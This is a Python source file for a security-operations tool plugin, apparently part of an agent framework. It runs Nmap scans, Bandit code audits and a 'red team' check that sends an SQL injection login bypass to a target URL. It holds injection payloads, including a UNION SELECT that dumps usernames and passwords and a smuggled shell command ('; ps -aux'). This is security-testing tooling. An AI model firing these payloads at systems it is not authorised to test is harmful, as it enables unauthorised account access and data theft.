import asyncio
import logging
import os
import subprocess
import httpx
from typing import Any, Dict

from infrastructure import BaseSkill


class SecOpsSkill(BaseSkill):
    name = "sec_ops"
    description = "Security Operations Toolset. Capability to perform Network Reconnaissance (Nmap) and Static Code Analysis (Bandit)."

    def __init__(self):
        self.logger = logging.getLogger("Skills.SecOps")

    async def execute(self, goal: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        """Commands:
        - action: 'nmap_scan' | 'audit_code' | 'red_team'
        """
        params = goal.get("params", {}) if "params" in goal else goal
        action = params.get("action")

        if action == "nmap_scan":
            return await self._run_nmap(params.get("target", "localhost"))
        elif action == "audit_code":
            return await self._run_bandit(params.get("path", "."))
        elif action == "red_team":
            return await self._run_red_audit(
                params.get("target", "http://localhost:5000")
            )
        else:
            return {"ok": False, "error": f"Unknown action: {action}"}

    async def _run_nmap(self, target: str) -> Dict[str, Any]:
        """Runs a basic Nmap scan (Async)."""
        self.logger.info("Initiating Nmap scan on %s...", target)
        try:
            # -F: Fast scan (100 most common ports)
            process = await asyncio.create_subprocess_exec(
                "nmap", "-F", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            
            if process.returncode == 0:
                return {"ok": True, "output": stdout.decode()}
            else:
                return {"ok": False, "error": stderr.decode()}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def _run_bandit(self, path: str) -> Dict[str, Any]:
        """Runs Bandit static analysis on code (Async)."""
        self.logger.info("Auditing code at %s...", path)
        try:
            # -r: recursive, -f json: json output
            process = await asyncio.create_subprocess_exec(
                "bandit", "-r", path, "-f", "json",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            return {"ok": True, "report": stdout.decode()}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _generate_payload(self, vuln_type: str) -> str:
        """Generates an exploitation payload dynamically.
        """
        if vuln_type == "sqli_bypass":
            return "' OR '1'='1"
        elif vuln_type == "sqli_union":
             return "' UNION SELECT username, password FROM users --"
        elif vuln_type == "rce_ping":
             return "; ps -aux"
        else:
             return "TEST_PAYLOAD"

    async def _run_red_audit(self, target_url: str) -> Dict[str, Any]:
        """Red Team Audit.
        Tests for basic SQL Injection vulnerability on the target.
        """
        self.logger.info("Auditing Target: %s", target_url)

        # DYNAMIC PAYLOAD GENERATION
        payload = self._generate_payload("sqli_bypass")
        self.logger.info("Generated Payload: %s", payload)

        try:
            # Assume target is the vuln_app login
            full_url = f"{target_url}/login?username=admin{payload}&password=foo"
            async with httpx.AsyncClient() as client:
                response = await client.get(full_url, timeout=5)
            
            if response.status_code == 200 and "success" in response.text:
                 self.logger.warning("VULNERABILITY CONFIRMED: Target is susceptible to SQL Injection.")
                 return {"ok": True, "vulnerable": True, "details": "SQLi Bypass Successful via ' OR '1'='1"}
            else:
                 return {"ok": True, "vulnerable": False, "details": "Attack failed (Target seems secure)"}
                 
        except Exception as e:
            return {"ok": False, "error": f"Audit failed: {e}"}
